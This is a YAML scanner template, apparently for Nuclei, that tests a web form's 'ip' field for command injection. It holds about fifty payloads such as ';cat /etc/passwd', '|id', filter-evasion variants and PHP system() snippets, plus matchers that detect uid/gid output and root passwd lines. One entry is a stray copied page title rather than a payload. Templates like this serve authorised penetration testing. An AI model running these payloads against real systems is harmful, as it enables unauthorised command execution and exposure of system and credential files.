
id: command-injection

info:
  name: Command Injection Template
  author: suriryuk
  severity: Critical
  description: Determine whether a command injection attack was successful.
  tags: RCE, cmdi

http:
  - pre-condition:
    - type: dsl
      dsl:
        - "method == POST"
        - "len(body) > 0"
      condition: and

  - raw:
    - |
      POST {{BaseURL}} HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded

      ip={{injection}}&Submit=Submit

    payloads:
      injection:
        - ";cat /etc/passwd"
        - ";cat$u /etc$u/passwd$u "
        - "& id"
        - "<id>"
        - "|id"
        - "%28echo%20%22RCE%20payloads.%27%29"
        - "%27%7Cwhoami"
        - "%26cat%20/etc/passwd"
        - "%5Cnls"
        - "cat /etc/passwd"
        - "a|/usr/bin/id"
        - "%24cat%20%2Fetc%24%7BIFS%7Dpasswd"
        - "%7Ccat%20/etc/passwd%3B"
        - "; id| |id # %27%20id"
        - "%22id;"
        - "a%27id"
        - "\\n%26%20cat%20/etc/passwd"
        - "id;"
        - "%2Cid%20"
        - "id;"
        - "<id"
        - "%24id;"
        - ";id"
        - "%26id"
        - "cat$u /etc$u/passwd$u |"
        - "<id"
        - "%26cat+/etc/passwd"
        - "&cat /etc/passwd"
        - "| id |"
        - "%7Bsystem%28%22id%22%29%7D"
        - "<?php echo \"Hello!\"; ?>"
        - "%2Acat%20/etc/passwd"
        - "%26cat%2520/etc/passwd%26%26id%26%26cat%2520%2Fetc%24%2Fpasswd%26"
        - "&&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd"
        - "id;"
        - "<?php system(\"id\");?>"
        - "\\nid\\n"
        - "cat /etc/passwd"
        - ";system(\"cat /etc/passwd\")"
        - "<?php system(\"id\");?>"
        - "%24%7Bsystem%28%22id%22%29%7D"
        - ";id"
        - "| id"
        - "%29%2Bid"
        - "cat$u /etc$u/passwd$u"
        - "cat%20%2Fetc%24%2Bpasswd"
        - "<?php system(\"cat /etc/passwd\"); ?>"
        - ";id"
        - "command-injection-payload-list/README.md at master Â· payloadbox/command-injection-payload-list"
        - ";id|"

    stop-at-first-match: false
    matchers-condition: and
    matchers:
      - type: regex
        name: attack-success
        regex:
          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"

      - type: word
        name: attack-success-id
        words:
          - "www-data"
        part: body
        